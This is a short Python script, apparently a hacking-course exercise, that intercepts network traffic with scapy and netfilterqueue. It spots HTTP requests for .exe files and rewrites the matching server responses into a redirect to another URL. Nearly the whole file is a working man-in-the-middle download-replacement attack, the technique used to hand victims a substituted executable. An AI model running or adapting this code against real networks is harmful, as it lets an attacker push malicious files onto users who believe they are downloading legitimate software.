#!/usr/bin/env python3
import scapy.all as scapy
import netfilterqueue

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # Debugging: Log packet summary
    print(scapy_packet.summary())

    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
        payload = scapy_packet[scapy.Raw].load.decode(errors="ignore")
        if scapy_packet[scapy.TCP].dport == 10000:  # Intercept HTTP Request
            if ".exe" in payload:
                print("[+] EXE request detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 10000:  # Intercept HTTP Response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with redirect")
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nlocation: http://www.example.org/index.asp\n\n".encode()
                )
                packet.set_payload(bytes(modified_packet))

    # Accept the packet
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("[*] Starting packet interception...")
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Stopping packet interception.")
